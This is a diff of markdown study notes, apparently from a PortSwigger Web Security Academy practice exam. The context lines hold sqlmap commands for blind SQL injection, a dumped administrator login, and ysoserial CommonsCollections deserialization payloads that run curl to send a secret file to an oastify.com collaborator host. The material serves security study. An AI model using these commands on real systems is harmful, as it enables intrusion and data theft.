@@ -64,11 +64,11 @@ session=Vc7knhz7SA5oM4RjHOJpfOSzkkDD7MI2
 
 Got into carlos's account
 password: 93c2516debbc64a4
-![Practice Exam 1-20260222221305403](Practice%20Exam%201-20260222221305403.png)
+![[Practice Exam 1-20260222221305403.png]]
 
 Stage 2
 Target scan `https://0a9800b9036075b780453f6100bb00d4.web-security-academy.net/advanced_search?SearchTerm=aaa&organize_by=DATE&blogArtist=Rich+Man`
-![Practice Exam 1-20260222221646999](Practice%20Exam%201-20260222221646999.png)
+![[Practice Exam 1-20260222221646999.png]]
 
 This worked -- listed the database and database name=public
 Can use `*`  as an injection point but sqlmap didn't find it
@@ -77,16 +77,16 @@ sqlmap -u 'https://0a3900d5040d89d0808344da009c00e5.web-security-academy.net/adv
 ```
 
 
-![Practice Exam 1-20260222223339559](Practice%20Exam%201-20260222223339559.png)
+![[Practice Exam 1-20260222223339559.png]]
 Booloean based blind
-![Practice Exam 1-20260222223410359](Practice%20Exam%201-20260222223410359.png)
+![[Practice Exam 1-20260222223410359.png]]
 
 list the tables
 ```
 sqlmap -u 'https://0a9800b9036075b780453f6100bb00d4.web-security-academy.net/advanced_search?SearchTerm=aaa&organize_by=*&blogArtist=Rich+Man' --random-agent --time-sec 10 --cookie='_lab=46%7cMCwCFE0DLD%2bY54NUnEqSD9bJl6EKdt4xAhQk4%2fgHfCx5qpvpOYbIw5tjKr6IFeLgdKL7gygJLboJvxWkE9xx9VK0qZVFbdNkkGRf29vc9%2fMfx7bBcqeqGRp434XoptHMEtH%2bytv808%2fSpv%2bGR%2fa9E5jY5xckIfg47FdI%2fsgyR9px2%2fQ%3d; session=RIfbZbDcnaXxWCHiiHViFnnCjgL8uVbQ' --dbms PostgreSQL --level=5 --risk=3 -p 'organize_by' --batch --technique=B -D public --tables
 ```
 
-![Practice Exam 1-20260222223705737](Practice%20Exam%201-20260222223705737.png)
+![[Practice Exam 1-20260222223705737.png]]
 
 dump the contents of the users table
 ```
@@ -97,31 +97,31 @@ Used this. It's faster.
 ```
 sqlmap -r sqli_request --level=5 --risk=3 -p 'organize_by' --batch -D public -T users --dump
 ```
-![Practice Exam 1-20260223143625066](Practice%20Exam%201-20260223143625066.png)
+![[Practice Exam 1-20260223143625066.png]]
 
 Login in with `administrator:b235d711d5858825`
-![Practice Exam 1-20260223143702017](Practice%20Exam%201-20260223143702017.png)
+![[Practice Exam 1-20260223143702017.png]]
 
 Click on the admin panel and see a new `admin-prefs` cookie. Highlighting it doesn't fully decode it. 
-![Practice Exam 1-20260223143836740](Practice%20Exam%201-20260223143836740.png)
+![[Practice Exam 1-20260223143836740.png]]
 
 ---
 Automated
 use cyberchef magic wand. Click the magic wand again and it will show you it is gzip.
-![Practice Exam 1-20260223150917126](Practice%20Exam%201-20260223150917126.png)
-![Practice Exam 1-20260223150953849](Practice%20Exam%201-20260223150953849.png)
+![[Practice Exam 1-20260223150917126.png]]
+![[Practice Exam 1-20260223150953849.png]]
 
 Manual
 Send to decoder > See %3d, %2f, etc. so it is url encoded. then you see it ends with == so it's base64. google `1f 8b header` and it shows this is gzip. https://en.wikipedia.org/wiki/List_of_file_signatures
 
 This is a JSON CommonCollection thing.
-![Practice Exam 1-20260223144535677](Practice%20Exam%201-20260223144535677.png)
+![[Practice Exam 1-20260223144535677.png]]
 ---
 Automated
 Use Java Deserialized Scanner. If Sleep doesn't work, try DNS (vuln libraries).
 Then Compress using gzip > encode using base64 > encode using URL encoding.
 We can use Apache CommonCollection3 to generate a payload.
-![Practice Exam 1-20260223145853605](Practice%20Exam%201-20260223145853605.png)
+![[Practice Exam 1-20260223145853605.png]]
 
 Right click > send to exploitation tab.
 Did not work
@@ -136,11 +136,11 @@ CommonsCollections3 'curl --data@/home/carlos/secret https://6bixp3vpfmutur4k953
 
 If you use a CommonsCollections that doesn't work, it will show "ERROR IN YSOSERIAL COMMAND. SEE STDERR FOR DETAILS" 
 Used CommonsCollections6.
-![Practice Exam 1-20260223154617594](Practice%20Exam%201-20260223154617594.png)
+![[Practice Exam 1-20260223154617594.png]]
 
 When you use the one that works, you get a response and Burp collab back.
-![Practice Exam 1-20260223154707559](Practice%20Exam%201-20260223154707559.png)
-![Pasted image 20260223154717](Pasted%20image%2020260223154717.png)
+![[Practice Exam 1-20260223154707559.png]]
+![[Pasted image 20260223154717.png]]
 
 Use dig to try it out first. If you get a DNS query back with the commonscollection you picked, then that is the one to use.
 ```
@@ -165,10 +165,10 @@ CommonsCollections7 'curl https://s5yjjppb98ofody63rxw0ott0k6nudi2.oastify.com -
 **DID TO ADD JAVA 8 TO FIX THIS**
 
 If get IncompleteAnnotationException... missing element entrySet error, go through all the collections 1-6.
-![Practice Exam 1-20260223151152786](Practice%20Exam%201-20260223151152786.png)
+![[Practice Exam 1-20260223151152786.png]]
 
 ERROR IN YSOSERIAL: fix.
-![Practice Exam 1-20260223154515447](Practice%20Exam%201-20260223154515447.png)
+![[Practice Exam 1-20260223154515447.png]]
 ```
 /Library/Java/JavaVirtualMachines/temurin-8.jdk/Contents/Home/bin/java
 
@@ -193,10 +193,10 @@ Paste the output of this command to decoder.
 2. encode gzip
 3. encode base64
 4. encode url
-![Practice Exam 1-20260223153214952](Practice%20Exam%201-20260223153214952.png)
+![[Practice Exam 1-20260223153214952.png]]
 
 Paste it in admin-prefs > got a 500 error but check Collaborator.
-![Practice Exam 1-20260223153238849](Practice%20Exam%201-20260223153238849.png)
+![[Practice Exam 1-20260223153238849.png]]
 
 Submit and solve.
-![Practice Exam 1-20260223153306026](Practice%20Exam%201-20260223153306026.png)
+![[Practice Exam 1-20260223153306026.png]]
